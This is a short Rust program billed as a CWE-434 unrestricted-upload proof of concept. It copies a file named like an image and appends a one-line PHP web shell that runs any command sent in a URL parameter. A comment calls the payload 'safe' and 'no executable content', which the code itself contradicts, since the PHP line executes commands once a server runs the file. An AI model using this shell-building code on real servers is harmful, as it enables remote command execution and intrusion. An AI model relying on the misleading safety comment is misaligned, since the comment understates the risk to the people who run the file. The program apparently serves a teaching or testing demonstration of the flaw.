use std::fs::File;
use std::io::{Read, Write};
use std::env;

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 3 {
        println!("Usage: {} <fake.jpg> <shell.txt>", args[0]);
        return;
    }
    
    // Safe text payload (no executable content)
    let payload = "# PHP Shell Template - CWE-434 Demo\n<?php system($_GET['cmd']); ?>";
    
    let mut input = File::open(&args[1]).expect("Failed to open input");
    let mut output = File::create(&args[2]).expect("Failed to create output");
    
    // No validation - copies ANY file to dangerous extension
    std::io::copy(&mut input, &mut output).expect("Copy failed");
    output.write_all(payload.as_bytes()).expect("Write failed");
    
    println!("✅ CWE-434 PoC: File saved as {}", args[2]);
}
